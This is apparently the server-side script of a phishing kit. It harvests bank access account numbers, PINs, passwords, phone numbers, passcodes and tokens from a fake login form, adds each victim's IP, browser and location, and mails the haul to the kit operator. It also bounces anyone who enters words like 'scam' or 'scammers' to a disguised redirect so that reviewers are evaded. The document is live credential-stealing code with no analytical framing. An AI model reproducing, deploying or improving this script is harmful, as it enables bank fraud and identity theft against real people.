<?php
error_reporting(0);
include("mail.php");

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function getBrowser()
{
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'Linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'Mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'Windows';
    }
   
    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent))
    {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent))
    {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent))
    {
        $bname = 'Apple Safari';
        $ub = "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Opera';
        $ub = "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent))
    {
        $bname = 'Netscape';
        $ub = "Netscape";
    }
   
    // finally get the correct version number
    $known = array('Version', $ub, 'other');
    $pattern = '#(?<browser>' . join('|', $known) .
    ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
    if (!preg_match_all($pattern, $u_agent, $matches)) {
        // we have no matching number just continue
    }
   
    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }
   
    // check if we have a number
    if ($version==null || $version=="") {$version="?";}
   
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
}

$Location = ""." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];


$bad_words = array('4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b17ch','b1tch','ballbag','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bunny fucker','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cl1t','clit','clitoris','clits','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cokmuncher','coksucka','cummer','cumming','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','dickhead','dildo','dildos','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fagging','faggitt','faggot','faggs','fagot','fagots','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','adsd','asdasd','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuker','fukker','fukkin','fukwhit','fukwit','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','god-dam','god-damned','goddamn','goddamned','hardcoresex ','heshe','hoare','horniest','hotsex','jack-off ','jackoff','jerk-off ','jism','jizm ','kawk','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kondum','kondums','kumming','kunilingus','l3i+ch','l3itch','lmfao','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasms ','p0rn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','porn','porno','pornography','pornos','prick','pricks ','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shagger','shaggin','shagging','shemale','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','sluts','smegma','snatch','son-of-a-bitch','spunk','s_h_i_t','t1tt1e5','t1tties','teets','testical','testicle','titfuck','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wank','wanker','wanky','whoar','whore','willies','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','sample');


$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT']; 

$AccessAccount = $_POST['AccessAccount'];
$PIN = $_POST['PIN'];
$Operator = $_POST['Operator'];
$p1 = $_POST['p1'];
$phonenr = $_POST['phonenr'];
$passcode = $_POST['passcode'];
$tok = $_POST['tok'];
$ua=getBrowser();
$session_id = generateRandomString(80);



$message .= "+ ------------------------------------------ + \n";
$message .= "+ LAc \n";
$message .= "| ANr: $AccessAccount\n";
$message .= "| PIZZ: $PIN\n";
$message .= "| UIS: $Operator\n";
$message .= "+ ------------------------------------------ + \n";
$message .= "| Pippps: $p1\n";
$message .= "+ ------------------------------------------ + \n";
$message .= "| PHNu: $phonenr \n";
$message .= "| PCodd: $passcode \n";
$message .= "| TKNu: $tok \n";
$message .= "+ ------------------------------------------ + \n";
$message .= "+ Victim Information \n";
$message .= "| User IP: ".$ip."\n";
$message .= "| Date: ".$adddate."\n";
$message .= "| Browser: " . $ua['name'] . " " . $ua['version'] . " \n";
$message .= "| Operating System:  " .$ua['platform'] . "  \n";
$message .= "| Location: $Location \n";
$message .= "| User Agent: ".$useragent."\n";
$message .= "| - by JuffaZ\n";
$message .= "+ ------------------------------------------ +  \n\n";



$subject="n3mRez | NKP-KOT |$ip";
$from= "From: isdott";

foreach($bad_words as $bad_word){
    if(stristr($_POST['tok'], $bad_word) !== false) {
        exit(header("Location:  http://nullrefer.com/?https://www.google.com/"));
    }
}
if (empty($tok))  {
        exit(header("Location: http://nullrefer.com/?https://www.google.com/"));
    }   



mail($youremail, "$subject", $message, $from);

{
header("Location: ../finish.php?session_id=$session_id");
}

?>